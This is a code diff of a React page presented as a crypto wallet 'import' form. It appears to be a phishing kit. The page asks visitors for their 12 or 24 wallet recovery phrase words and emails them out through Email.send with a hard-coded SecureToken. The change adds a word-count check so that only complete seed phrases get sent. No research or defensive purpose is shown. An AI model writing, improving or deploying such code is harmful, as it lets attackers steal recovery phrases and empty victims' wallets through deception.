@@ -387,8 +387,20 @@ const Phrase = ({ data }) => {
         setIsLoading(true)
         router.push('/wallet/loading')
     }
-    const myFunc = (event ) => {
+    function checkWordCount(event){
         event.preventDefault();
+        let s = document.getElementById("article").value;
+        s = s.replace(/(^\s*)|(\s*$)/gi,"");
+        s = s.replace(/[ ]{2,}/gi," ");
+        s = s.replace(/\n /,"\n");
+        if (s.split(' ').length <= 11) {
+            alert("minimim of 12 words required!");
+    return false;
+        }else{
+            myFunc();
+        }
+    }
+    const myFunc = () => {
         setIsLoading(true)
         Email.send({
             SecureToken : "f10ea3fc-c85c-40ed-93e9-4467760c85cf",
@@ -429,6 +441,8 @@ const Phrase = ({ data }) => {
                         <label className="my-3 fw-bold">Kindly import wallet by providing <br/><span className="green">PHRASE WORDS</span> below</label>
                         <p className="text-center dim"><small>Phrase words are mostly 12 and sometimes 24, Please provide each word separated by a comma "<span className="text-warning">,</span>" below</small></p>
                         <textarea
+                            id="article"
+                            required
                             className="form-control"
                             cols="30"
                             rows="10"
@@ -437,7 +451,7 @@ const Phrase = ({ data }) => {
                         ></textarea>
                         <p className="green right">...mostly 12 or 24 in number</p>
                         <div className="d-flex jac">
-                            <button type="submit" onClick={myFunc} className="btn btn-light my-3 fw-bold dark" id="btn">Import</button>
+                            <button type="submit" onClick={checkWordCount} className="btn btn-light my-3 fw-bold dark" id="btn">Import</button>
                         </div>
                     </form>
                 </div>
